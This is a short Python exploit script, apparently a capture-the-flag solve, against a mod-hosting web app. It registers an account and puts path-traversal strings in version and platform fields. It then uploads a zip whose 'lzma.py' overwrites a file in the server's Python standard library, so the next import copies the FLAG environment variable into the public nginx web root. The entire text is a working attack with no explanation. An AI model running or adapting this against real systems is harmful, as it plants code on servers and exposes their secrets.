import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
u = "u%d"%random.randint(10000,99999); pw="pass12345"
requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
tok = pf.login(u,pw)
print("ver len check:", len("../../../usr/local"), len("lib/python3.11"))
def w(tok, ver, code, filename, data):
    pid = pf.create_platform(tok, code, name="z")
    mid = pf.create_mod(tok, ver, title="z")
    bid = pf.create_build(tok, mid, pid)
    return pf.upload_zip(tok, mid, bid, {filename: data})
mal = b'import os\nopen("/usr/share/nginx/html/rlmark.txt","w").write(os.environ.get("FLAG","NOFLAG"))\n'
r = w(tok, "../../../usr/local", "lib/python3.11", "lzma.py", mal)
print("write ->", r.status_code, r.text[:120])
